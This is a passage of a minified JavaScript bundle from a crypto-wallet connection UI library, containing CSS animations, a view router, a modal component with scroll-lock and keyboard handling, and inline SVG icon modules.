      opacity: 1;
    }
    to {
      transform: translateX(10px);
      opacity: 0;
    }
  }

  @keyframes slide-left-in {
    from {
      transform: translateX(-10px);
      opacity: 0;
    }
    to {
      transform: translateX(0);
      opacity: 1;
    }
  }

  @keyframes slide-right-out {
    from {
      transform: translateX(0px);
      opacity: 1;
    }
    to {
      transform: translateX(-10px);
      opacity: 0;
    }
  }

  @keyframes slide-right-in {
    from {
      transform: translateX(10px);
      opacity: 0;
    }
    to {
      transform: translateX(0);
      opacity: 1;
    }
  }
`;var RB=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Hy=class extends he{constructor(){super(),this.resizeObserver=void 0,this.prevHeight="0px",this.prevHistoryLength=1,this.unsubscribe=[],this.view=tt.state.view,this.viewDirection="",this.unsubscribe.push(tt.subscribeKey("view",e=>this.onViewChange(e)))}firstUpdated(){this.resizeObserver=new ResizeObserver(([e])=>{const t=`${e?.contentRect.height}px`;this.prevHeight!=="0px"&&(this.style.setProperty("--prev-height",this.prevHeight),this.style.setProperty("--new-height",t),this.style.animation="w3m-view-height 150ms forwards ease",this.style.height="auto"),setTimeout(()=>{this.prevHeight=t,this.style.animation="unset"},jf.ANIMATION_DURATIONS.ModalHeight)}),this.resizeObserver?.observe(this.getWrapper())}disconnectedCallback(){this.resizeObserver?.unobserve(this.getWrapper()),this.unsubscribe.forEach(e=>e())}render(){return F`<div class="w3m-router-container" view-direction="${this.viewDirection}">
      ${this.viewTemplate()}
    </div>`}viewTemplate(){switch(this.view){case"AccountSettings":return F`<w3m-account-settings-view></w3m-account-settings-view>`;case"Account":return F`<w3m-account-view></w3m-account-view>`;case"AllWallets":return F`<w3m-all-wallets-view></w3m-all-wallets-view>`;case"ApproveTransaction":return F`<w3m-approve-transaction-view></w3m-approve-transaction-view>`;case"BuyInProgress":return F`<w3m-buy-in-progress-view></w3m-buy-in-progress-view>`;case"ChooseAccountName":return F`<w3m-choose-account-name-view></w3m-choose-account-name-view>`;case"Connect":return F`<w3m-connect-view></w3m-connect-view>`;case"Create":return F`<w3m-connect-view walletGuide="explore"></w3m-connect-view>`;case"ConnectingWalletConnect":return F`<w3m-connecting-wc-view></w3m-connecting-wc-view>`;case"ConnectingWalletConnectBasic":return F`<w3m-connecting-wc-basic-view></w3m-connecting-wc-basic-view>`;case"ConnectingExternal":return F`<w3m-connecting-external-view></w3m-connecting-external-view>`;case"ConnectingSiwe":return F`<w3m-connecting-siwe-view></w3m-connecting-siwe-view>`;case"ConnectWallets":return F`<w3m-connect-wallets-view></w3m-connect-wallets-view>`;case"ConnectSocials":return F`<w3m-connect-socials-view></w3m-connect-socials-view>`;case"ConnectingSocial":return F`<w3m-connecting-social-view></w3m-connecting-social-view>`;case"Downloads":return F`<w3m-downloads-view></w3m-downloads-view>`;case"EmailLogin":return F`<w3m-email-login-view></w3m-email-login-view>`;case"EmailVerifyOtp":return F`<w3m-email-verify-otp-view></w3m-email-verify-otp-view>`;case"EmailVerifyDevice":return F`<w3m-email-verify-device-view></w3m-email-verify-device-view>`;case"GetWallet":return F`<w3m-get-wallet-view></w3m-get-wallet-view>`;case"Networks":return F`<w3m-networks-view></w3m-networks-view>`;case"SwitchNetwork":return F`<w3m-network-switch-view></w3m-network-switch-view>`;case"Profile":return F`<w3m-profile-view></w3m-profile-view>`;case"SwitchAddress":return F`<w3m-switch-address-view></w3m-switch-address-view>`;case"Transactions":return F`<w3m-transactions-view></w3m-transactions-view>`;case"OnRampProviders":return F`<w3m-onramp-providers-view></w3m-onramp-providers-view>`;case"OnRampActivity":return F`<w3m-onramp-activity-view></w3m-onramp-activity-view>`;case"OnRampTokenSelect":return F`<w3m-onramp-token-select-view></w3m-onramp-token-select-view>`;case"OnRampFiatSelect":return F`<w3m-onramp-fiat-select-view></w3m-onramp-fiat-select-view>`;case"UpgradeEmailWallet":return F`<w3m-upgrade-wallet-view></w3m-upgrade-wallet-view>`;case"UpdateEmailWallet":return F`<w3m-update-email-wallet-view></w3m-update-email-wallet-view>`;case"UpdateEmailPrimaryOtp":return F`<w3m-update-email-primary-otp-view></w3m-update-email-primary-otp-view>`;case"UpdateEmailSecondaryOtp":return F`<w3m-update-email-secondary-otp-view></w3m-update-email-secondary-otp-view>`;case"UnsupportedChain":return F`<w3m-unsupported-chain-view></w3m-unsupported-chain-view>`;case"Swap":return F`<w3m-swap-view></w3m-swap-view>`;case"SwapSelectToken":return F`<w3m-swap-select-token-view></w3m-swap-select-token-view>`;case"SwapPreview":return F`<w3m-swap-preview-view></w3m-swap-preview-view>`;case"WalletSend":return F`<w3m-wallet-send-view></w3m-wallet-send-view>`;case"WalletSendSelectToken":return F`<w3m-wallet-send-select-token-view></w3m-wallet-send-select-token-view>`;case"WalletSendPreview":return F`<w3m-wallet-send-preview-view></w3m-wallet-send-preview-view>`;case"WhatIsABuy":return F`<w3m-what-is-a-buy-view></w3m-what-is-a-buy-view>`;case"WalletReceive":return F`<w3m-wallet-receive-view></w3m-wallet-receive-view>`;case"WalletCompatibleNetworks":return F`<w3m-wallet-compatible-networks-view></w3m-wallet-compatible-networks-view>`;case"WhatIsAWallet":return F`<w3m-what-is-a-wallet-view></w3m-what-is-a-wallet-view>`;case"ConnectingMultiChain":return F`<w3m-connecting-multi-chain-view></w3m-connecting-multi-chain-view>`;case"WhatIsANetwork":return F`<w3m-what-is-a-network-view></w3m-what-is-a-network-view>`;case"ConnectingFarcaster":return F`<w3m-connecting-farcaster-view></w3m-connecting-farcaster-view>`;case"SwitchActiveChain":return F`<w3m-switch-active-chain-view></w3m-switch-active-chain-view>`;case"RegisterAccountName":return F`<w3m-register-account-name-view></w3m-register-account-name-view>`;case"RegisterAccountNameSuccess":return F`<w3m-register-account-name-success-view></w3m-register-account-name-success-view>`;case"SmartSessionCreated":return F`<w3m-smart-session-created-view></w3m-smart-session-created-view>`;case"SmartSessionList":return F`<w3m-smart-session-list-view></w3m-smart-session-list-view>`;case"SIWXSignMessage":return F`<w3m-siwx-sign-message-view></w3m-siwx-sign-message-view>`;case"Pay":return F`<w3m-pay-view></w3m-pay-view>`;case"PayLoading":return F`<w3m-pay-loading-view></w3m-pay-loading-view>`;default:return F`<w3m-connect-view></w3m-connect-view>`}}onViewChange(e){jm.hide();let t=jf.VIEW_DIRECTION.Next;const{history:i}=tt.state;i.length<this.prevHistoryLength&&(t=jf.VIEW_DIRECTION.Prev),this.prevHistoryLength=i.length,this.viewDirection=t,setTimeout(()=>{this.view=e},jf.ANIMATION_DURATIONS.ViewTransition)}getWrapper(){return this.shadowRoot?.querySelector("div")}};Hy.styles=f0t;RB([te()],Hy.prototype,"view",void 0);RB([te()],Hy.prototype,"viewDirection",void 0);Hy=RB([Ot("w3m-router")],Hy);const p0t=ge`
  :host {
    z-index: var(--w3m-z-index);
    display: block;
    backface-visibility: hidden;
    will-change: opacity;
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    pointer-events: none;
    opacity: 0;
    background-color: var(--wui-cover);
    transition: opacity 0.2s var(--wui-ease-out-power-2);
    will-change: opacity;
  }

  :host(.open) {
    opacity: 1;
  }

  :host(.appkit-modal) {
    position: relative;
    pointer-events: unset;
    background: none;
    width: 100%;
    opacity: 1;
  }

  wui-card {
    max-width: var(--w3m-modal-width);
    width: 100%;
    position: relative;
    animation: zoom-in 0.2s var(--wui-ease-out-power-2);
    animation-fill-mode: backwards;
    outline: none;
    transition:
      border-radius var(--wui-duration-lg) var(--wui-ease-out-power-1),
      background-color var(--wui-duration-lg) var(--wui-ease-out-power-1);
    will-change: border-radius, background-color;
  }

  :host(.appkit-modal) wui-card {
    max-width: 400px;
  }

  wui-card[shake='true'] {
    animation:
      zoom-in 0.2s var(--wui-ease-out-power-2),
      w3m-shake 0.5s var(--wui-ease-out-power-2);
  }

  wui-flex {
    overflow-x: hidden;
    overflow-y: auto;
    display: flex;
    align-items: center;
    justify-content: center;
    width: 100%;
    height: 100%;
  }

  @media (max-height: 700px) and (min-width: 431px) {
    wui-flex {
      align-items: flex-start;
    }

    wui-card {
      margin: var(--wui-spacing-xxl) 0px;
    }
  }

  @media (max-width: 430px) {
    wui-flex {
      align-items: flex-end;
    }

    wui-card {
      max-width: 100%;
      border-bottom-left-radius: var(--local-border-bottom-mobile-radius);
      border-bottom-right-radius: var(--local-border-bottom-mobile-radius);
      border-bottom: none;
      animation: slide-in 0.2s var(--wui-ease-out-power-2);
    }

    wui-card[shake='true'] {
      animation:
        slide-in 0.2s var(--wui-ease-out-power-2),
        w3m-shake 0.5s var(--wui-ease-out-power-2);
    }
  }

  @keyframes zoom-in {
    0% {
      transform: scale(0.95) translateY(0);
    }
    100% {
      transform: scale(1) translateY(0);
    }
  }

  @keyframes slide-in {
    0% {
      transform: scale(1) translateY(50px);
    }
    100% {
      transform: scale(1) translateY(0);
    }
  }

  @keyframes w3m-shake {
    0% {
      transform: scale(1) rotate(0deg);
    }
    20% {
      transform: scale(1) rotate(-1deg);
    }
    40% {
      transform: scale(1) rotate(1.5deg);
    }
    60% {
      transform: scale(1) rotate(-1.5deg);
    }
    80% {
      transform: scale(1) rotate(1deg);
    }
    100% {
      transform: scale(1) rotate(0deg);
    }
  }

  @keyframes w3m-view-height {
    from {
      height: var(--prev-height);
    }
    to {
      height: var(--new-height);
    }
  }
`;var Lp=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};const eZ="scroll-lock";class ch extends he{constructor(){super(),this.unsubscribe=[],this.abortController=void 0,this.hasPrefetched=!1,this.enableEmbedded=Be.state.enableEmbedded,this.open=Ri.state.open,this.caipAddress=de.state.activeCaipAddress,this.caipNetwork=de.state.activeCaipNetwork,this.shake=Ri.state.shake,this.filterByNamespace=We.state.filterByNamespace,this.initializeTheming(),rt.prefetchAnalyticsConfig(),this.unsubscribe.push(Ri.subscribeKey("open",e=>e?this.onOpen():this.onClose()),Ri.subscribeKey("shake",e=>this.shake=e),de.subscribeKey("activeCaipNetwork",e=>this.onNewNetwork(e)),de.subscribeKey("activeCaipAddress",e=>this.onNewAddress(e)),Be.subscribeKey("enableEmbedded",e=>this.enableEmbedded=e),We.subscribeKey("filterByNamespace",e=>{this.filterByNamespace!==e&&!de.getAccountData(e)?.caipAddress&&(rt.fetchRecommendedWallets(),this.filterByNamespace=e)}))}firstUpdated(){if(this.caipAddress){if(this.enableEmbedded){Ri.close(),this.prefetch();return}this.onNewAddress(this.caipAddress)}this.open&&this.onOpen(),this.enableEmbedded&&this.prefetch()}disconnectedCallback(){this.unsubscribe.forEach(e=>e()),this.onRemoveKeyboardListener()}render(){return this.style.cssText=`
      --local-border-bottom-mobile-radius: ${this.enableEmbedded?"clamp(0px, var(--wui-border-radius-l), 44px)":"0px"};
    `,this.enableEmbedded?F`${this.contentTemplate()}
        <w3m-tooltip></w3m-tooltip> `:this.open?F`
          <wui-flex @click=${this.onOverlayClick.bind(this)} data-testid="w3m-modal-overlay">
            ${this.contentTemplate()}
          </wui-flex>
          <w3m-tooltip></w3m-tooltip>
        `:null}contentTemplate(){return F` <wui-card
      shake="${this.shake}"
      data-embedded="${ye(this.enableEmbedded)}"
      role="alertdialog"
      aria-modal="true"
      tabindex="0"
      data-testid="w3m-modal-card"
    >
      <w3m-header></w3m-header>
      <w3m-router></w3m-router>
      <w3m-snackbar></w3m-snackbar>
      <w3m-alertbar></w3m-alertbar>
    </wui-card>`}async onOverlayClick(e){e.target===e.currentTarget&&await this.handleClose()}async handleClose(){await Qoe.safeClose()}initializeTheming(){const{themeVariables:e,themeMode:t}=ao.state,i=Us.getColorTheme(t);Ldt(e,i)}onClose(){this.open=!1,this.classList.remove("open"),this.onScrollUnlock(),ts.hide(),this.onRemoveKeyboardListener()}onOpen(){this.open=!0,this.classList.add("open"),this.onScrollLock(),this.onAddKeyboardListener()}onScrollLock(){const e=document.createElement("style");e.dataset.w3m=eZ,e.textContent=`
      body {
        touch-action: none;
        overflow: hidden;
        overscroll-behavior: contain;
      }
      w3m-modal {
        pointer-events: auto;
      }
    `,document.head.appendChild(e)}onScrollUnlock(){const e=document.head.querySelector(`style[data-w3m="${eZ}"]`);e&&e.remove()}onAddKeyboardListener(){this.abortController=new AbortController;const e=this.shadowRoot?.querySelector("wui-card");e?.focus(),window.addEventListener("keydown",t=>{if(t.key==="Escape")this.handleClose();else if(t.key==="Tab"){const{tagName:i}=t.target;i&&!i.includes("W3M-")&&!i.includes("WUI-")&&e?.focus()}},this.abortController)}onRemoveKeyboardListener(){this.abortController?.abort(),this.abortController=void 0}async onNewAddress(e){const t=de.state.isSwitchingNamespace,i=Ze.getPlainAddress(e);!i&&!t?Ri.close():t&&i&&tt.goBack(),await z1.initializeIfEnabled(),this.caipAddress=e,de.setIsSwitchingNamespace(!1)}onNewNetwork(e){const t=this.caipNetwork,i=t?.caipNetworkId?.toString(),n=t?.chainNamespace,s=e?.caipNetworkId?.toString(),o=e?.chainNamespace,a=i!==s,l=a&&!(n!==o),u=t?.name===Ht.UNSUPPORTED_NETWORK_NAME,d=tt.state.view==="ConnectingExternal",h=!de.getAccountData(e?.chainNamespace)?.caipAddress,f=tt.state.view==="UnsupportedChain",p=Ri.state.open;let g=!1;p&&!d&&(h?a&&(g=!0):(f||l&&!u)&&(g=!0)),g&&tt.state.view!=="SIWXSignMessage"&&tt.goBack(),this.caipNetwork=e}prefetch(){this.hasPrefetched||(rt.prefetch(),rt.fetchWalletsByPage({page:1}),this.hasPrefetched=!0)}}ch.styles=p0t;Lp([V({type:Boolean})],ch.prototype,"enableEmbedded",void 0);Lp([te()],ch.prototype,"open",void 0);Lp([te()],ch.prototype,"caipAddress",void 0);Lp([te()],ch.prototype,"caipNetwork",void 0);Lp([te()],ch.prototype,"shake",void 0);Lp([te()],ch.prototype,"filterByNamespace",void 0);let i$=class extends ch{};i$=Lp([Ot("w3m-modal")],i$);let n$=class extends ch{};n$=Lp([Ot("appkit-modal")],n$);const g0t=Object.freeze(Object.defineProperty({__proto__:null,get AppKitModal(){return n$},get W3mModal(){return i$},W3mModalBase:ch},Symbol.toStringTag,{value:"Module"})),m0t=xe`<svg
  width="14"
  height="14"
  viewBox="0 0 14 14"
  fill="none"
  xmlns="http://www.w3.org/2000/svg"
>
  <path
    fill="currentColor"
    fill-rule="evenodd"
    clip-rule="evenodd"
    d="M7.0023 0.875C7.48571 0.875 7.8776 1.26675 7.8776 1.75V6.125H12.2541C12.7375 6.125 13.1294 6.51675 13.1294 7C13.1294 7.48325 12.7375 7.875 12.2541 7.875H7.8776V12.25C7.8776 12.7332 7.48571 13.125 7.0023 13.125C6.51889 13.125 6.12701 12.7332 6.12701 12.25V7.875H1.75054C1.26713 7.875 0.875244 7.48325 0.875244 7C0.875244 6.51675 1.26713 6.125 1.75054 6.125H6.12701V1.75C6.12701 1.26675 6.51889 0.875 7.0023 0.875Z"
    fill="#667dff"
  /></svg
>`,w0t=Object.freeze(Object.defineProperty({__proto__:null,addSvg:m0t},Symbol.toStringTag,{value:"Module"})),b0t=xe`<svg fill="none" viewBox="0 0 24 24">
  <path
    style="fill: var(--wui-color-accent-100);"
    d="M10.2 6.6a3.6 3.6 0 1 1-7.2 0 3.6 3.6 0 0 1 7.2 0ZM21 6.6a3.6 3.6 0 1 1-7.2 0 3.6 3.6 0 0 1 7.2 0ZM10.2 17.4a3.6 3.6 0 1 1-7.2 0 3.6 3.6 0 0 1 7.2 0ZM21 17.4a3.6 3.6 0 1 1-7.2 0 3.6 3.6 0 0 1 7.2 0Z"
  />
</svg>`,v0t=Object.freeze(Object.defineProperty({__proto__:null,allWalletsSvg:b0t},Symbol.toStringTag,{value:"Module"})),y0t=xe`<svg
  fill="none"
  viewBox="0 0 21 20"
>
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M10.5 2.42908C6.31875 2.42908 2.92859 5.81989 2.92859 10.0034C2.92859 14.1869 6.31875 17.5777 10.5 17.5777C14.6813 17.5777 18.0714 14.1869 18.0714 10.0034C18.0714 5.81989 14.6813 2.42908 10.5 2.42908ZM0.928589 10.0034C0.928589 4.71596 5.21355 0.429077 10.5 0.429077C15.7865 0.429077 20.0714 4.71596 20.0714 10.0034C20.0714 15.2908 15.7865 19.5777 10.5 19.5777C5.21355 19.5777 0.928589 15.2908 0.928589 10.0034ZM10.5 5.75003C11.0523 5.75003 11.5 6.19774 11.5 6.75003L11.5 10.8343L12.7929 9.54137C13.1834 9.15085 13.8166 9.15085 14.2071 9.54137C14.5976 9.9319 14.5976 10.5651 14.2071 10.9556L11.2071 13.9556C10.8166 14.3461 10.1834 14.3461 9.79291 13.9556L6.79291 10.9556C6.40239 10.5651 6.40239 9.9319 6.79291 9.54137C7.18343 9.15085 7.8166 9.15085 8.20712 9.54137L9.50002 10.8343L9.50002 6.75003C9.50002 6.19774 9.94773 5.75003 10.5 5.75003Z"
    clip-rule="evenodd"
  /></svg
>`,x0t=Object.freeze(Object.defineProperty({__proto__:null,arrowBottomCircleSvg:y0t},Symbol.toStringTag,{value:"Module"})),C0t=xe`
<svg width="36" height="36">
  <path
    d="M28.724 0H7.271A7.269 7.269 0 0 0 0 7.272v21.46A7.268 7.268 0 0 0 7.271 36H28.73A7.272 7.272 0 0 0 36 28.728V7.272A7.275 7.275 0 0 0 28.724 0Z"
    fill="url(#a)"
  />
  <path
    d="m17.845 8.271.729-1.26a1.64 1.64 0 1 1 2.843 1.638l-7.023 12.159h5.08c1.646 0 2.569 1.935 1.853 3.276H6.434a1.632 1.632 0 0 1-1.638-1.638c0-.909.73-1.638 1.638-1.638h4.176l5.345-9.265-1.67-2.898a1.642 1.642 0 0 1 2.844-1.638l.716 1.264Zm-6.317 17.5-1.575 2.732a1.64 1.64 0 1 1-2.844-1.638l1.17-2.025c1.323-.41 2.398-.095 3.249.931Zm13.56-4.954h4.262c.909 0 1.638.729 1.638 1.638 0 .909-.73 1.638-1.638 1.638h-2.367l1.597 2.772c.45.788.185 1.782-.602 2.241a1.642 1.642 0 0 1-2.241-.603c-2.69-4.666-4.711-8.159-6.052-10.485-1.372-2.367-.391-4.743.576-5.549 1.075 1.846 2.682 4.631 4.828 8.348Z"
    fill="#fff"
  />
  <defs>
    <linearGradient id="a" x1="18" y1="0" x2="18" y2="36" gradientUnits="userSpaceOnUse">
      <stop stop-color="#18BFFB" />
      <stop offset="1" stop-color="#2072F3" />
    </linearGradient>
  </defs>
</svg>`,E0t=Object.freeze(Object.defineProperty({__proto__:null,appStoreSvg:C0t},Symbol.toStringTag,{value:"Module"})),_0t=xe`<svg fill="none" viewBox="0 0 40 40">
  <g clip-path="url(#a)">
    <g clip-path="url(#b)">
      <circle cx="20" cy="19.89" r="20" fill="#000" />
      <g clip-path="url(#c)">
        <path
          fill="#fff"
          d="M28.77 23.3c-.69 1.99-2.75 5.52-4.87 5.56-1.4.03-1.86-.84-3.46-.84-1.61 0-2.12.81-3.45.86-2.25.1-5.72-5.1-5.72-9.62 0-4.15 2.9-6.2 5.42-6.25 1.36-.02 2.64.92 3.47.92.83 0 2.38-1.13 4.02-.97.68.03 2.6.28 3.84 2.08-3.27 2.14-2.76 6.61.75 8.25ZM24.2 7.88c-2.47.1-4.49 2.69-4.2 4.84 2.28.17 4.47-2.39 4.2-4.84Z"
        />
      </g>
    </g>
  </g>
  <defs>
    <clipPath id="a"><rect width="40" height="40" fill="#fff" rx="20" /></clipPath>
    <clipPath id="b"><path fill="#fff" d="M0 0h40v40H0z" /></clipPath>
    <clipPath id="c"><path fill="#fff" d="M8 7.89h24v24H8z" /></clipPath>
  </defs>
</svg>`,S0t=Object.freeze(Object.defineProperty({__proto__:null,appleSvg:_0t},Symbol.toStringTag,{value:"Module"})),A0t=xe`<svg fill="none" viewBox="0 0 14 15">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M7 1.99a1 1 0 0 1 1 1v7.58l2.46-2.46a1 1 0 0 1 1.41 1.42L7.7 13.69a1 1 0 0 1-1.41 0L2.12 9.53A1 1 0 0 1 3.54 8.1L6 10.57V3a1 1 0 0 1 1-1Z"
    clip-rule="evenodd"
  />
</svg>`,I0t=Object.freeze(Object.defineProperty({__proto__:null,arrowBottomSvg:A0t},Symbol.toStringTag,{value:"Module"})),T0t=xe`<svg fill="none" viewBox="0 0 14 15">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M13 7.99a1 1 0 0 1-1 1H4.4l2.46 2.46a1 1 0 1 1-1.41 1.41L1.29 8.7a1 1 0 0 1 0-1.41L5.46 3.1a1 1 0 0 1 1.41 1.42L4.41 6.99H12a1 1 0 0 1 1 1Z"
    clip-rule="evenodd"
  />
</svg>`,k0t=Object.freeze(Object.defineProperty({__proto__:null,arrowLeftSvg:T0t},Symbol.toStringTag,{value:"Module"})),N0t=xe`<svg fill="none" viewBox="0 0 14 15">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M1 7.99a1 1 0 0 1 1-1h7.58L7.12 4.53A1 1 0 1 1 8.54 3.1l4.16 4.17a1 1 0 0 1 0 1.41l-4.16 4.17a1 1 0 1 1-1.42-1.41l2.46-2.46H2a1 1 0 0 1-1-1Z"
    clip-rule="evenodd"
  />
</svg>`,P0t=Object.freeze(Object.defineProperty({__proto__:null,arrowRightSvg:N0t},Symbol.toStringTag,{value:"Module"})),$0t=xe`<svg fill="none" viewBox="0 0 14 15">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M7 13.99a1 1 0 0 1-1-1V5.4L3.54 7.86a1 1 0 0 1-1.42-1.41L6.3 2.28a1 1 0 0 1 1.41 0l4.17 4.17a1 1 0 1 1-1.41 1.41L8 5.4v7.59a1 1 0 0 1-1 1Z"
    clip-rule="evenodd"
  />
</svg>`,R0t=Object.freeze(Object.defineProperty({__proto__:null,arrowTopSvg:$0t},Symbol.toStringTag,{value:"Module"})),O0t=xe`<svg
  xmlns="http://www.w3.org/2000/svg"
  width="12"
  height="13"
  viewBox="0 0 12 13"
  fill="none"
>
  <path
    fill-rule="evenodd"
    clip-rule="evenodd"
    d="M5.61391 1.57124C5.85142 1.42873 6.14813 1.42873 6.38564 1.57124L11.0793 4.38749C11.9179 4.89067 11.5612 6.17864 10.5832 6.17864H9.96398V10.0358H10.2854C10.6996 10.0358 11.0354 10.3716 11.0354 10.7858C11.0354 11.2 10.6996 11.5358 10.2854 11.5358H1.71416C1.29995 11.5358 0.964172 11.2 0.964172 10.7858C0.964172 10.3716 1.29995 10.0358 1.71416 10.0358H2.03558L2.03558 6.17864H1.41637C0.438389 6.17864 0.0816547 4.89066 0.920263 4.38749L5.61391 1.57124ZM3.53554 6.17864V10.0358H5.24979V6.17864H3.53554ZM6.74976 6.17864V10.0358H8.46401V6.17864H6.74976ZM8.64913 4.67864H3.35043L5.99978 3.089L8.64913 4.67864Z"
    fill="currentColor"
  /></svg
>`,B0t=Object.freeze(Object.defineProperty({__proto__:null,bankSvg:O0t},Symbol.toStringTag,{value:"Module"})),M0t=xe`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M4 6.4a1 1 0 0 1-.46.89 6.98 6.98 0 0 0 .38 6.18A7 7 0 0 0 16.46 7.3a1 1 0 0 1-.47-.92 7 7 0 0 0-12 .03Zm-2.02-.5a9 9 0 1 1 16.03 8.2A9 9 0 0 1 1.98 5.9Z"
    clip-rule="evenodd"
  />
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M6.03 8.63c-1.46-.3-2.72-.75-3.6-1.35l-.02-.01-.14-.11a1 1 0 0 1 1.2-1.6l.1.08c.6.4 1.52.74 2.69 1 .16-.99.39-1.88.67-2.65.3-.79.68-1.5 1.15-2.02A2.58 2.58 0 0 1 9.99 1c.8 0 1.45.44 1.92.97.47.52.84 1.23 1.14 2.02.29.77.52 1.66.68 2.64a8 8 0 0 0 2.7-1l.26-.18h.48a1 1 0 0 1 .12 2c-.86.51-2.01.91-3.34 1.18a22.24 22.24 0 0 1-.03 3.19c1.45.29 2.7.73 3.58 1.31a1 1 0 0 1-1.1 1.68c-.6-.4-1.56-.76-2.75-1-.15.8-.36 1.55-.6 2.2-.3.79-.67 1.5-1.14 2.02-.47.53-1.12.97-1.92.97-.8 0-1.45-.44-1.91-.97a6.51 6.51 0 0 1-1.15-2.02c-.24-.65-.44-1.4-.6-2.2-1.18.24-2.13.6-2.73.99a1 1 0 1 1-1.1-1.67c.88-.58 2.12-1.03 3.57-1.31a22.03 22.03 0 0 1-.04-3.2Zm2.2-1.7c.15-.86.34-1.61.58-2.24.24-.65.51-1.12.76-1.4.25-.28.4-.29.42-.29.03 0 .17.01.42.3.25.27.52.74.77 1.4.23.62.43 1.37.57 2.22a19.96 19.96 0 0 1-3.52 0Zm-.18 4.6a20.1 20.1 0 0 1-.03-2.62 21.95 21.95 0 0 0 3.94 0 20.4 20.4 0 0 1-.03 2.63 21.97 21.97 0 0 0-3.88 0Zm.27 2c.13.66.3 1.26.49 1.78.24.65.51 1.12.76 1.4.25.28.4.29.42.29.03 0 .17-.01.42-.3.25-.27.52-.74.77-1.4.19-.5.36-1.1.49-1.78a20.03 20.03 0 0 0-3.35 0Z"
    clip-rule="evenodd"
  />
</svg>`,D0t=Object.freeze(Object.defineProperty({__proto__:null,browserSvg:M0t},Symbol.toStringTag,{value:"Module"})),L0t=xe`<svg
  xmlns="http://www.w3.org/2000/svg"
  width="12"
  height="13"
  viewBox="0 0 12 13"
  fill="none"
>
  <path
    fill-rule="evenodd"
    clip-rule="evenodd"
    d="M4.16072 2C4.17367 2 4.18665 2 4.19968 2L7.83857 2C8.36772 1.99998 8.82398 1.99996 9.19518 2.04018C9.5895 2.0829 9.97577 2.17811 10.3221 2.42971C10.5131 2.56849 10.6811 2.73647 10.8198 2.92749C11.0714 3.27379 11.1666 3.66007 11.2094 4.0544C11.2496 4.42561 11.2496 4.88188 11.2495 5.41105V7.58896C11.2496 8.11812 11.2496 8.57439 11.2094 8.94561C11.1666 9.33994 11.0714 9.72621 10.8198 10.0725C10.6811 10.2635 10.5131 10.4315 10.3221 10.5703C9.97577 10.8219 9.5895 10.9171 9.19518 10.9598C8.82398 11 8.36772 11 7.83856 11H4.16073C3.63157 11 3.17531 11 2.80411 10.9598C2.40979 10.9171 2.02352 10.8219 1.67722 10.5703C1.48621 10.4315 1.31824 10.2635 1.17946 10.0725C0.927858 9.72621 0.832652 9.33994 0.78993 8.94561C0.749713 8.5744 0.749733 8.11813 0.749757 7.58896L0.749758 5.45C0.749758 5.43697 0.749758 5.42399 0.749757 5.41104C0.749733 4.88188 0.749713 4.42561 0.78993 4.0544C0.832652 3.66007 0.927858 3.27379 1.17946 2.92749C1.31824 2.73647 1.48621 2.56849 1.67722 2.42971C2.02352 2.17811 2.40979 2.0829 2.80411 2.04018C3.17531 1.99996 3.63157 1.99998 4.16072 2ZM2.96567 3.53145C2.69897 3.56034 2.60687 3.60837 2.55888 3.64324C2.49521 3.6895 2.43922 3.74549 2.39296 3.80916C2.35809 3.85715 2.31007 3.94926 2.28117 4.21597C2.26629 4.35335 2.25844 4.51311 2.25431 4.70832H9.74498C9.74085 4.51311 9.733 4.35335 9.71812 4.21597C9.68922 3.94926 9.6412 3.85715 9.60633 3.80916C9.56007 3.74549 9.50408 3.6895 9.44041 3.64324C9.39242 3.60837 9.30031 3.56034 9.03362 3.53145C8.75288 3.50103 8.37876 3.5 7.79961 3.5H4.19968C3.62053 3.5 3.24641 3.50103 2.96567 3.53145ZM9.74956 6.20832H2.24973V7.55C2.24973 8.12917 2.25076 8.5033 2.28117 8.78404C2.31007 9.05074 2.35809 9.14285 2.39296 9.19084C2.43922 9.25451 2.49521 9.31051 2.55888 9.35677C2.60687 9.39163 2.69897 9.43966 2.96567 9.46856C3.24641 9.49897 3.62053 9.5 4.19968 9.5H7.79961C8.37876 9.5 8.75288 9.49897 9.03362 9.46856C9.30032 9.43966 9.39242 9.39163 9.44041 9.35677C9.50408 9.31051 9.56007 9.25451 9.60633 9.19084C9.6412 9.14285 9.68922 9.05075 9.71812 8.78404C9.74854 8.5033 9.74956 8.12917 9.74956 7.55V6.20832ZM6.74963 8C6.74963 7.58579 7.08541 7.25 7.49961 7.25H8.2496C8.6638 7.25 8.99958 7.58579 8.99958 8C8.99958 8.41422 8.6638 8.75 8.2496 8.75H7.49961C7.08541 8.75 6.74963 8.41422 6.74963 8Z"
    fill="currentColor"
  /></svg
>`,U0t=Object.freeze(Object.defineProperty({__proto__:null,cardSvg:L0t},Symbol.toStringTag,{value:"Module"})),j0t=xe`<svg
  width="28"
  height="28"
  viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path
    fill-rule="evenodd"
    clip-rule="evenodd"
